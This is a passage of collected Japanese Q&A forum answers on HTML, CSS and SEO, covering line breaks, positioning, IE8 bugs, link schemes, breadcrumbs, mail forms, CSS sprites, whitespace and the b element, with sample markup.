デザイン的に改行させたいのなら、brよりもspanの方が良いです。 brは何らかの区切り（文の区切りや、住所の区切りなど）を示します。 <h1><span style="display:block">これが私の</span><span>サイトタイトル</span></h1> <wbr>というのがありますが、日本語ではOperaしか対応していないようです。 （wbrタグを使う為の条件があるのかもしれませんが。今後OperaのレンダリングエンジンがWebkitになるので、wbrが効かなくなる可能性もあります。） <h1>これが私の<wbr>サイトタイトル</h1> ただ、brとwbrの意味関係がよくわかりません。 http://www.w3.org/TR/2012/CR-html5-20121217/text … 例を見ると、私の使い方（英単語の区切り、日本語の言葉／節／詞の区切り、禁則処理）と同じように思えるのですが。。。 適切な位置で改行させた方が、私はかっこいいとおもいますけどね。デザイナーならこれくらいのこだわりがあっても、むしろ当然だと思います。 （添付画像はOKWaveサイトにあった広告バナースクリーンショットを改変しました） ただし、これがSEOに対してどのような影響があるかはわかりません。 SEO会社なら調査されているかもしれませんが、 おそらく同程度のSEOを施したサイトを100個くらい作って、<span>や<wbr>あり、なしで半分ずつにして統計を取るくらいの事をしないと、問題ないか、デザインを諦めるべきか、というのはわからないと思います。 相当な作業になると思いますので、無料で聞くのは無理じゃないでしょうか。 ともあれ情報商材は詐欺も多いようですのでご注意下さい。
position:relative は、通常通りレンダリングした後に位置をずらす指定なので、 この記法だと、四角の下に1pxだけ右下にズレた四角が表示されるだけです。 <div style="position:relative;width:32px;height:32px;background-color:#000"></div> <div style="position:relative;top:1px;left:1px;width:30px;height:30px;background-color:#0e0"></div> 四角を内部に重ねるのなら、発想を変えて四角の中に四角を入れては如何でしょう <div style="position:relative;width:32px;height:32px;background-color:#000"> <div style="position:relative;top:1px;left:1px;width:30px;height:30px;background-color:#0e0"> </div> </div> または position:absolute で絶対位置指定をすれば解決です。 <div style="position:relative"> <div style="position:absolute;top:0px;left:0px;width:32px;height:32px;background-color:#000"></div> <div style="position:absolute;top:1px;left:1px;width:30px;height:30px;background-color:#0e0"></div> </div>
何がいけないというよりIE8のバグです。 親コンテナブロックにもz-indexを指定するとか HTMLやスタイルシートの設定が分かりませんので、検索して該当するものを探してください。 　⇒ie8 z-index バグ - Google 検索( https://www.google.co.jp/#safe=off&hl=ja&sclient … )
IE8以前で動かない理由を「低速だから」としたのは、たしかに正確ではなかったですね。訂正します。 ちなみに、IE8以前でもVMLを使えばあのようなアニメーションは実現可能です。 （VMLについて）⇒ http://www.tohoho-web.com/wwwvml.htm IE8以前のためだけに特別なコードを書くってのを嫌ったのかもしれませんし、IE8以前は遅いのが原因かもしれませんが、本当のところは作った人しかわからないですね。
教えてあげた「ハブサイト」検索されました？ いくつか検索上位のものをあげますね。 http://whitehatseo.jp/authority_site-and-hub_site/ http://seo.siyo.org/seostudy/seo2503/ ちょっと長いですけど、ゆっくりお読みください。 ご自分で捜されても似たようなのが出てきます。 #2にも書きましたが、googleはいろんな観点から順位を決めています。紹介ページjを読めばわかると思いますが、リンクをすればリンクジュースは減るでしょうが、ハブスコアが増え、検索上位に上がることもある。リンクをすれば、一律に不利になるわけではありません。勿論、一律不利になる貼り方もありますので、websaitojisaku さんのリンクがどちらになるのかは私判断しかねます。 いや、知りませんよ。私は神ではないので……。そういう考え方もあるということです。同じ事が起こってもどう解釈するかはひとそれぞれですし、googleが正解を公開してるわけでもなく、公開している事も理想論で、実際には黒いseoといたちごっこなわけですからね。あっと、これも#2で書きましたね。
○秒ごとに画像を変える 　参考ＵＲＬ：http://www.sky.sannet.ne.jp/masapine/java_gazou2 … 　こちらにサンプルと必要なタグが載ってます
＞サイト内の別ページに移動すると、ページ倍率がその都度変わってしまいます。 　IEは知りませんが、Chromeやfirefoxだと、Ctrl + ＋,Ctrl ＋ －で拡大、縮小したままで他のページに移動しても、その解像度は維持されるはずです。 ＞サイト閲覧中に変更したページ倍率を、ページ移動後もそのまま引き継ぐにはどうすれば良いのでしょうか？ 　ですので、例えば視覚障害者がCtrl + +で拡大したら、それは維持されますから。なにもしなければ・・ 　DreamWeverも、HTMLやCSSのしっかりした知識がないと使いこなせません。というか、その知識を前提として使うものです。
カラミーショップでしたら、ここで聞くよりサポートで 　⇒よくある質問 - ネットショップ開業ショッピングカートサービス【カラーミーショップ】( http://shop-pro.jp/?mode=faq ) 　聞かないと、無理でしょう。一般的なものではありませんので・・
そもそも相互リンクプログラムには参加すべきではありません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 品質に関するガイドライン - 具体的なガイドライン 　次のような手法を使用しないようにします: ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )］より 　そのような相互リンクに参加したばっかりに、SPAMと判定され数ヶ月検索エンジンから配所された超有名メーカーサイトもあります。 　被リンクが有効なのは、あるテーマでよく参照されている優れたサイトにて、さらに参照先として本文中で、まっとうにリンクされているような場合だけです。 [例] 　盆栽でよく知られて多くの被リンクも受けているようなページの記事内で、季節ごとの剪定方法については<a href="http：//ＡＡＡＡ">松の剪定のページ</a>によくまとめられています。 　と言うような形での非リンクです。 　私がこの世界に入った十数年前は、確かに一定の効果はありましたが、今では相互リンクは百害あって一利なしと考えたほうが良いでしょう。 　もし、単なるリンクプログラムだけのページを作るとこちらは兎も角、相手サイトにも迷惑がかかる場合もあります。・・googleに申請すると修正はされます・・ 　私は、よく相互リンクの依頼を受けますが、次のように返信しています。 ＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿ 　当サイトへのリンクは、申請いただかなくても一切自由です。貴サイトの利用者にとって役に立つようでしたら、サイト内の任意のページ、またはページ内アンカーに対して自由にリンクしてください。ページ内アンカーが必要な場合は、遠慮なくご連絡ください。対処します。 　なお、貴サイトの内容を拝見させていただいて、当方の訪問者にとって有益と判断した場合に限りリンクさせていただく場合もあるかもしれません。 　なお、当サイトではリンクのためだけのページは設けていません。各ページにおいて、参照先(参考文献)として必要な場合のみ、当該の記事内、もしくは参考文献一覧にてリンクさせていただきます。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ 　とね。 　あくまでリンクは、Wikiの記事を読まれるとお分かりのように、記事内、もしくは記事末尾の参照先のような形が良いでしょう。その際も、しっかり吟味する必要があります。 ★要は、 検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。( http://support.google.com/webmasters/bin/answer. … ) につきるかと。
VBAとは似ても似つかない。 XMLです。 　⇒Google Chrome拡張機能入門 (全20回) - プログラミングならドットインストール( http://dotinstall.com/lessons/basic_chrome_v2 ) 　なお、アドオン開発は、firefoxのほうが資料が豊富で楽です。 　⇒５章：Firefox拡張機能を作ってみよう！ 開発環境の準備 - Firefox拡張機能開発チュートリアル (XHTML)( http://kittttttan.web.fc2.com/xul/extension5.html ) 　とか・・・言語はXULです。
属性値の囲みはどちらでも構いませんが、ご自身で使い方を統一した方がいいでしょう。 たとえば <button onclick="location.href = 'abc.html';">ボタン</button> といった形で、両方を使わなければいけないシーンが出てきます。 ごちゃ混ぜに使っているとコーディングミスの原因になりますので、自分自身でルールを決めておくとミスを減らせます。
>「div.nav ul li.top:hover～」の記述の仕方も知らなかったので助かりました。 　子孫セレクタの書き方のことでしょうか?? 　あなたが書かれたスタイルシートは、CSS(カスケーディングスタイルシート)です。CSSの最大の特徴は、カスケーディングなのです。カスケーディングを知らなきゃ意味がない。 　プロパティなどを学ぶより、先に徹底的に身につけておかないと、スタイルシートは無論、HTMLも複雑怪奇なものになりますよ。 　⇒5.セレクタ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　⇒6.値の割り当て、カスケード処理、継承( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　はすべて、しっかりね・ 特に、 ・セレクタと詳細度(特異性) ・カスケーディング 　HTMLが正しくてスタイルシートがうまく適用されなかったとしたら、詳細度で負けていたか、カスケーディングで上書きされてしまったかだからです。
　ソースを見る限り、単なるページないリンクのようにしか見えませんが？ 　なら、ちゃんと<a href="#A">とすべきです。 　　（リンク先にする場合は使用できる文字に制限があります。IDと同じ名前空間を持ちます） 　inputを使うべきではありません。javascriptが無効なユーザーや、検索エンジンにはリンクの情報が伝わりません。 　それが、ずれるのは、プロポーショナルフォントだからです。 　しかし、リンクで記述し、スタイルシートでデザインすれば幅を指定できますから問題ないはずです。 ★Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html# ) 　のDATAタブで検証済みShift_JISのHTML4.01strictです。 ★デザインはスタイルシートに任せてあるので、先で自由にデザインの変更が可能です。 　ボタンだろうが、ドロップダウンメニューだろうが・・ご随意に ★タブは＿に置換してあるので戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- #INDEX{ display:block;padding:0; position:fixed;top:100px;width:25em; line-height:2em;font-size:0.8em;text-align:center; } #INDEX ol{margin:0;padding:0;} #INDEX li{list-style:none;} #INDEX li a{ display:block; list-style:none;width:4em; float:left; border:solid 1px gray;border-radius:0.5em; margin-left:0.5em;margin:0.2em;text-decoration:none; background-color:silver; background:linear-gradient(white,silver); } #INDEX li a:hover{background-color:white; background: linear-gradient(white,rgb(220,220,220));} #INDEX li{clear:left;} #INDEX li ol li{clear:none;} div.section h2,div.section div.section{margin-left:20em;} div.section div.section{border:solid 1px blue;} div.section div.section div.section{min-height:300px;margin-left:0;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<ol id="INDEX"> ＿＿＿<li><a href="#A">あ行</a> ＿＿＿＿<ol> ＿＿＿＿＿<li><a href="#I">い</a></li> ＿＿＿＿＿<li><a href="#U">う</a></li> ＿＿＿＿＿<li><a href="#E">え</a></li> ＿＿＿＿＿<li><a href="#O">お</a></li> ＿＿＿＿</ol> ＿＿＿</li> ＿＿＿<li><a href="#K">か行</a> ＿＿＿＿<ol> ＿＿＿＿＿<li><a href="#KI">き</a></li> ＿＿＿＿＿<li><a href="#KU">く</a></li> ＿＿＿＿＿<li><a href="#KE">け</a></li> ＿＿＿＿＿<li><a href="#KO">こ</a></li> ＿＿＿＿</ol> ＿＿＿</li> ＿＿＿<li><a href="#S">さ行</a> ＿＿＿＿<ol> ＿＿＿＿＿<li><a href="#SI">し</a></li> ＿＿＿＿＿<li><a href="#SU">す</a></li> ＿＿＿＿＿<li><a href="#SE">せ</a></li> ＿＿＿＿＿<li><a href="#SO">そ</a></li> ＿＿＿＿</ol> ＿＿＿</li> ＿＿</ol> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<div class="section" ID="A"> ＿＿＿<div class="section"> ＿＿＿＿<h3>あ</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="I"> ＿＿＿＿<h3>い</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="U"> ＿＿＿＿<h3>う</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="E"> ＿＿＿＿<h3>え</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="O"> ＿＿＿＿<h3>お</h3> ＿＿＿</div> ＿＿</div> ＿＿<div class="section" id="K"> ＿＿＿<div class="section"> ＿＿＿＿<h3>か</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="KI"> ＿＿＿＿<h3>き</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="KU"> ＿＿＿＿<h3>く</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="KE"> ＿＿＿＿<h3>け</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="KO"> ＿＿＿＿<h3>こ</h3> ＿＿＿</div> ＿＿</div> ＿＿<div class="section" id="S"> ＿＿＿<div class="section"> ＿＿＿＿<h3>さ</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="SI"> ＿＿＿＿<h3>し</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="SU"> ＿＿＿＿<h3>す</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="SE"> ＿＿＿＿<h3>せ</h3> ＿＿＿</div> ＿＿＿<div class="section" ID="SO"> ＿＿＿＿<h3>そ</h3> ＿＿＿</div> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
ダウンレベルから見える条件付きコメント http://ja.wikipedia.org/wiki/%E6%9D%A1%E4%BB%B6% …
最初だけは、メモ帳が良いです。 メモ帳は最低限の機能しかありませんので、 メモ帳では何が出来るのか？何ができないのか？も学べますから。 ホームページビルダーなどのオーサリングツールを利用している多くの人は、 オーサリングツールが無い環境では何もできないのです。 つまり、学習はしていないということです。 小学生の算数（足し算）の授業で、電卓を与えるような話になります・・・ 勉強とは、基本をも理解する事が第一歩。 最低でも一週間はメモ帳を利用してみましょう。　次にテキストエディタの導入です。
よくあるパターンで、画像ファイルをアップロードし忘れてませんか？
こんにちは。 ＞例えば高速道路のジャンクションやパーキングエリアは表示されていません。 おやっ。　そんな機能があったのですかぁ… 興味があったので、ご提示のサイトでお勉強させていただきました。 （ご提示のところがドンピシャのようですが、私は、英語がさっぱりなので斜め読みしただけです） 「地図表記のうちの何がどのような分類になっているのかわからない」と思っていたら、親切なgoogleさんは（↓）のようなページを作ってくれていました。 http://gmaps-samples-v3.googlecode.com/svn/trunk … ここで、表示を赤色などにしておいていろいろ選択を変えてみると、地図上の対応しているアイテムの表示が変わるので、どのような分類になっているかわかりますし、そのまま「Show JSON」のボタンを押すとその表示のスタイルでのJSONまで作成してくれるので便利です。 食べログの地図を細かく分析はしていませんが、インフォウィンドウがあらかじめセットされているアイテムを非表示にしているようですね。 とはいうものの一部は残っているようで、例えば東京駅のそばの東京中央郵便局の〒マークをクリックするとインフォウィンドウが表示されます。（全部消しているわけではないみたい） （↑）のサイトで設定を変えてみれば、何を表示して何を表示しないか自由に選択が可能になりますので、試してみてください。 ちなみに、ご質問の例に出ている「高速道路のジャンクション」は { featureType: "poi.business", elementType: "labels.icon", stylers: [ { visibility: "off" } ] } をスタイルに設定することで消せます。 この場合、ジャンクション以外にも高速道路の出入り口やビルのクリック用アイコン（の一部）なども同じ分類なので、一緒に非表示になるようです。
いわゆるパンくずリスト(breadcrumb list)ですね。 サイト内で「迷い子」にならないために記述するのが目的です。 ・実際にたどり着いた経路をcookieやjavascriptを利用して表記する動的な方法 ・どのようにたどり着いたかは関係なく、階層にしたがって記述する位置的な方法 ・カテゴリーで記述する方法 があります。 　動的な方法の場合、検索エンジンや他のサイト、あるいは他のページから直接訪問した場合は、パンくずリストの意味がまったくありません。 　　たとえば、googleからたどり着いた「フルーツジュースの作りかたのページ」に 　それぞれの果物へのリンクがあるとgoogle→フルーツジュース→みかん　になります。 　このように、経路を元に戻る方法はAlt+←ないし履歴でたどれますから、機能的に重複してしまいます。 　よって、位置的な方法がもっとも良いでしょう。ただし、大規模なサイトでは煩雑になりすぎます。 　小規模なサイトで、カテゴリーでは、単純すぎてあまり手助けにはなりません。 　要は、利用者が迷い子にならないためと他のページへの誘導が目的ですから、ある程度整理した位置的なものが良いでしょう。 　あなたの場合は トップページ ＞ すべての食べ物 ＞ 果物 ＞ みかん 　が良いとおもいます。 　みかんの記事が面白かった、果物好きな訪問者が他の果物の記事も読みたいと思ったら、果物へ移動したいと思います。 ＞というのが理想なのですが、 　わざわざ、お節介いただくなくてもAlt+←で十分です。他の果物のページへ進みたい・・・と思われるのでは？？ 　作るのも楽ですしね。 　
　SEO会社の99.99%は、間違いなくインチキなので、どうアドバイスしたらよいかわかりません。 ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … ) 　ここと、それぞれのリンク先をしっかり読まれると分かりますが、まっとうな業者なら、すべてのコンテンツをゼロから書き直すでしょう。費用は当然高価なものになります。 　怪しい業者は、上記マニュアルの下にある「次のような手法を使用しないようにします」を行います。一時的には上位になっても、その効果は一時的で、最悪SPAMサイトとして排除されます。(googleも馬鹿じゃない、いわゆるパンダアップデート--黒白を付ける---を日々改善していますから。 　SEOは、所詮自分でするしかないです。 ・きちんと文書構造にしたがって検索エンジンに内容が分かるようマークアップする 　　--これが一番の基本です。 　　・メーカー独自拡張のHTMLを使う。 　　・テキストを画像に置き換えて表現する。 　　・余白制御のために画像を用いる。 　　・ページレイアウトの目的で表を用いる。 　　・HTMLでページを作らずにプログラムに頼る。 　　なんてテクニックを使わない。 　　( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )より ・検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。 ・ユーザーをだますようなことをしない。 ・検索エンジンでの掲載位置を上げるための不正行為をしない。ランクを競っているサイトや Google 社員に対して自分が行った対策を説明するときに、やましい点がないかどうかが判断の目安です。その他にも、ユーザーにとって役立つかどうか、検索エンジンがなくても同じことをするかどうか、などのポイントを確認してみてください。 ・どうすれば自分のウェブサイトが独自性、価値、または魅力のあるサイトといえるようになるかを考えてみる。同分野の他のサイトとの差別化を図ります。 　( http://support.google.com/webmasters/bin/answer. … ) 　それ以上の(検索順位アップと言う意味の)SEOはありません。 　そもそもSEOとは、検索エンジンが正しく理解できるようにする「検索エンジン最適化」と言う意味です。上位に表示されるのは、その結果のひとつに過ぎません。
No.2です。 「ソースにメールアドレスが書かれていませんか？」 と書きましたが、それは配布されているメールフォームに、 <input type="hidden" name="mailto" value="****@hoge.***" > と書かれているものを想定していました。 　この場合は、メール送信CGIのほうで、送信先を記入するべきです。 　あなたの言われるメールフォームが <form action="mailto" ・・・としているのでしたら、これは誤った方法です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから action = uri [CT] 　　この属性は、フォーム処理エージェントを指定する。HTTPスキームURI以外の 　値(mailtoとか)の場合のユーザエージェントの動作は、定義しない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　と書かれているように、その方法は使うべきではありません。それでメールが送信できるのは、あくまでブラウザのおまけ機能です。ブラウザにMUA(メールユーザーエージェント/メールソフト)が指定されている限られた人にしか利用できませんし、たとえ送信されても文字コードがiso-2022-jpでないため、文字化けの原因になったりします。 <form action="./cgi/mailer.cgi" method="post">のように指定して、サーバーにCGIなどのプログラムを作成してください。 　それが出来ない間は、機械的に読み取りにくい--目でも読みづらいですが、メールアドレスを画像にして、フォームではなく直接送信してもらう形にします。 <p> 　問合せは<img src="i/images/mailAddresss.jpg" width="240" height="30" alt="">のアドレスに</p> とか 　そして、CGIを設置する準備を 　⇒CGI RESCUE - CGIフリーソフト( http://www.rescue.ne.jp/ ) の「フォーム・アンケート・エディタ ほか」などにあります。 　このサイトの下の方に 基本的なことなど 　ＣＧＩ設置が初めての方へ(設置練習) 　ＦＴＰツール/パーミッションについて 　ダウンロードファイルの伸張＆展開の仕方 　テキストダウンロードについて など、詳しい説明があります。
No.3で示した方法は スプライトといわれる手法です。 　○　使用する画像を最初にすべて読み込んでしまうため、アクションのたびに画像を取得する必要がないため、動作が速い 　×　画像の座標をいちいち指定しなければならないので作業が煩雑 という特徴があります。 アクションのたびに背景画像を変える方法は 　○　アクションの都度画像を読み込むためタイムラグがあります。 　×　スタイルシートがとても簡単になります。 　そのため、その中間的手法として、リンク画像のみスプライトにして背景と切り離す手法を使うほうが現実的でしょう。スプライトの一種です。リンクの位置を位置を自在に設定できます。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"＿"http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- /* 基本 */ html,body{margin:0;padding:0;background-color:silver;} h1,h2,h3,p{margin:0 15px;line-height:1.8em;} div.header,div.section,div.footer{ ＿width:80%;min-width:640px;max-width:800px; ＿margin:0 auto; ＿background-color:white; } div.section{position:relative;min-height:400px;} div.section div.aside{position:absolute;top:0;right:0;width:200px;height:100%;background-color:aqua;} div.section h2,div.section p{margin-right:210px;} div.section div.aside p{margin:0 1em;} /* ここから:hover,activeの指定 */ ul#navi,ul#navi2{ ＿background-image:url(./images/hogehoge2.jpg); ＿width:270px;height:160px;/* サイズの指定 */ ＿margin:5px auto;/* センター配置 */ ＿padding:0; ＿display:block;list-style:none;/* ブロックに変更 */ ＿position:relative;/* 以下の位置基準とするため */ } ul#navi li a,ul#navi2 li a{ ＿display:block;/* ブロックに変更 */ ＿width:70px;height:30px;/* 幅と高さの初期設定 */ ＿overflow:hidden;text-indent:-10em; /* 字を消す */ ＿position:absolute; /* 絶対配置 */ ＿top:20px;/* 上からの初期位置 */ } ul#navi li a[href="./top.html"]{background-image:url(./images/goTop.gif);} ul#navi li a[href="./product/hoge1.html"]{background-image:url(./images/goProduct1.gif);} ul#navi li a[href="./product/hoge2.html"]{background-image:url(./images/goProduct2.gif);} ul#navi li a[href="./product/hoge3.html"]{background-image:url(./images/goProduct3.gif);} ul#navi li a[href="./product/hoge4.html"]{background-image:url(./images/goProduct4.gif);} ul#navi li a[href="./top.html"]{top:110px;left:110px;width:57px;} ul#navi li a[href="./product/hoge1.html"]{left:10px;} ul#navi li a[href="./product/hoge2.html"]{left:70px;top:60px} ul#navi li a[href="./product/hoge3.html"]{left:130px;} ul#navi li a[href="./product/hoge4.html"]{left:190px;top:60px} ul#navi li a:hover{background-position:0px -40px;} ul#navi li a:active{background-position:0px -80px;} /* 後方互換 */ ul#navi2 li.goTop a{background-image:url(./images/goTop.gif);} ul#navi2 li.goProduct1 a{background-image:url(./images/goProduct1.gif);} ul#navi2 li.goProduct2 a{background-image:url(./images/goProduct2.gif);} ul#navi2 li.goProduct3 a{background-image:url(./images/goProduct3.gif);} ul#navi2 li.goProduct4 a{background-image:url(./images/goProduct4.gif);} ul#navi2 li.goTop a{top:110px;left:110px;width:57px;} ul#navi2 li.goProduct1 a{left:10px;} ul#navi2 li.goProduct2 a{left:70px;top:60px} ul#navi2 li.goProduct3 a{left:130px;} ul#navi2 li.goProduct4 a{left:190px;top:60px} ul#navi2 li a:hover{background-position:0px -40px;} ul#navi2 li a:active{background-position:0px -80px;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<ul id="navi"> ＿＿＿<li><a href="./top.html">トップ</a></li> ＿＿＿<li><a href="./product/hoge1.html">製品1</a></li> ＿＿＿<li><a href="./product/hoge2.html">製品2</a></li> ＿＿＿<li><a href="./product/hoge3.html">製品3</a></li> ＿＿＿<li><a href="./product/hoge4.html">製品4</a></li> ＿＿</ul> ＿＿<ul id="navi2"> ＿＿＿<li class="goTop"><a href="./top.html">トップ</a></li> ＿＿＿<li class="goProduct1"><a href="./product/hoge1.html">製品1</a></li> ＿＿＿<li class="goProduct2"><a href="./product/hoge2.html">製品2</a></li> ＿＿＿<li class="goProduct3"><a href="./product/hoge3.html">製品3</a></li> ＿＿＿<li class="goProduct4"><a href="./product/hoge4.html">製品4</a></li> ＿＿</ul> ＿</div> ＿<div class="section"> ＿＿以下同文 ＿</div> </body> </html>
＞文字と文字の間に空白があったのですが、 　これはHTMLのソース--テキストの段階での空白でしょうか？言い換えると、 「ソース中の半角スペースが、ブラウザで表示させると半角スペースが空く」と言う意味でしょうか？それとも、「ソース中には半角スペースがないのに半角スペースが表示された」と言う意味でしょうか？ 　HTMLでは半角スペースを含む空白文字については次のように処理されます。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLでは、次に挙げる文字だけが空白類文字であると定義される。 　・ASCIIスペース (&#x0020;) 　・水平タブ (&#x0009;) 　・書式送り (&#x000C;) 　・ゼロ幅スペース (&#x200B;) 　行区切り類もまた、空白類文字である。 ・・・【中略】・・・ 　ここで、ソース文書中で語間に空白類が複数連なっている場合、・・・【中略】・・・ユーザエージェントは、・・・【中略】・・・連続する空白類の入力があった場合は1つにまとめてしまう必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［9.1 空白類( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 例えば、次のような詩を書くとします。＿＿タブを示します。 <p> What is the matter? ＿＿＿Never Mind! What is the mind? ＿＿＿No Matter! </p> 　これは、ルールどおり、 What is the matter? Never Mind! What is the mind? No Matter! 　と表示されるはずです。ソースを書くときに、折り返しても、タブを入れてもいずれも空白文字として処理され、それが複数繫がっている[改行コード][タブ][タブ]場合も、一文字の空白文字が挿入されます。 　これは日本語であっても <p> 古池や ＿＿かわず飛び込む 水の音 </p> だと 古池や かわず飛び込む 水の音 と表示されます。 は、上記空白文字に含まれていませんから、また、意味はno-break spaceと言う意味で、改行されてはまずい半角スペースを示す[文字実体参照]です。したがって <p> What is the matter? Never Mind! What is the mind? No Matter! </p> は省略しています。沢山書き加えてください。 と書くと違うでしょう。 　
ウェブマスターツールって方にて、サイトを登録。 --------------------------------------------- ＞自分のサイトをグーグルでヒットさせたいのですが Ａ、 ヒット？　どっちの意味かな？ 今現在GoogleでURLやメインキーワードで検索して出てこないなら登録した方が良いです。 つまり、インデックスされていないのならインデックスしてもらえる可能性が上がる。 大ヒットとか商用的目的（SEO）の話ならこれに登録しても無意味です。 あくまで、 Googleにサイトの存在や更新を教えてあげたり、 サイトを管理して、状況を把握する事が目的のツールだから。 ※完璧なサイトは登録不要という事です。
ある政治家さんのサイトをボランティアで作成した経験はありますが・・ 相当なスキルがあって、自慢できる優れたサイトを作れるなら、良い実績となるでしょう。 糞なサイトでしたら、あなたにとっても相手にとってもマイナスになるでしょう。 　それに見合う対価も相手のメリットデメリットも、私には判断できません。 　例えば、 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) をマイナスス点で通過したり、Lynxで見たら意味不明-- http://support.google.com/webmasters/bin/answer. … ＝SEOとして失格でしたら、誰にも実績としてアピールできないでしょう。 　まあ、CGIでも使って、相手先で文字と画像だけアップロードしたら自動的にページが作成できるようなものを作っておけば手離れです。
補足読みましたが、やはり意味不明です。 　現在も、[ドメイン]/web ないし、[ドメイン]/web/ でindex.htmlが表示されているわけですよね。 　これは、サーバーが/web ないし /web/ の要求を受けたとき、それがファイルか否かを判断してファイルでなければ、ディレクトリとして開いて見ます。その中にファイルが存在すると、「ディレクトリ一覧を表示する」か「DIRECTORY INDEXで指定されたファイルを表示するか」、もしくは「閲覧権限なし」を表示するかを、【指示どおり】判断します。 ＞「/web/」の指定ではディレクトリ全体に影響が出ます。 　の意味が分かりません。Directory Indexの影響が及ぶのは指定されたパス以下です。ルートに指定してあれば、そのまま適用されますが、/web/subにおいて、.htaccessで解除してしまえば無効になります。
原因は、セレクタと{(宣言ブロック)の間に存在する,の存在です。,は グループ化（Grouping）( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　に使用される記号です。 　⇒W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … ) なお、標準モードで動作させる場合はIE8でもエラーになるはずです。 　互換モードでは、正しく解釈しません。doctypeスイッチ( https://www.google.co.jp/search?q=DOCTYPE%E3%82% … )をきちんと記述して、どのブラウザでも標準モードで起動するようにすると、ブラウザ間の誤差は少なくなるでしょう。 なお、CSS2以降は基点となるセレクタを書きますから div.navi1 a:link, div.navi1 a:visited{ display:block; background-image:url(images/1.gif); text-decoration:none; line-height:30px; font-size:12px; text-align:left; height: 30px; padding-left:11px; font-weight: bold; color: #00FF00; } div.navi1 a:hover{ text-decoration:none; color:#FFFF00; } div.top a:link, .rank a:visited{ color:#379E02; } div.top a:hover{ color: #FF0066;} とかきちんと書くほうが良いでしょう。 　HTMLの書き方にも結構、疑問な部分もあります。 もっとシンプルでよりよい方法があります。そは後ほど・・
配布サイトからダウンロードしてきて、FTPでアップロードすればいいんです。
＞だったらBタグと同じ気がするのですが・・・ 　どこで学ばれたのか知りませんが、HTMLとは何かと言う根本--それも最も重要な基本を学ばれていないようです。 　Hyper Text Markup Language は、文書をそれを構成する要素に分解して、それぞれの構成要素をタグを使ってマークアップする言語で、どのように表示するとかは一切関係ありません。たまたま、ブラウザを使用するとそのブラウザか持っているスタイルシートで太字に表示されるだけです。言い換えるとスタイルシートでどのようにも表現は変更できるのです。 　h1～h6のheadeingを示すタグは、それで囲まれた部分が見出しだと示しているのですし、Pは段落(Pargraph)を示します。 　B要素は、HTML4.01では『B: ボールド体でレンダリング。』を示す要素で、HTML5では廃止候補に挙げられていました。 　HTML5では、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから The b element now represents a span of text to which attention is being drawn for utilitarian purposes without conveying any extra importance and with no implication of an alternate voice or mood, such as key words in a document abstract, product names in a review, actionable words in interactive text-driven software, or an article lede. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML5 differences from HTML4( http://www.w3.org/TR/2011/WD-html5-diff-20110525 … )］より ---b 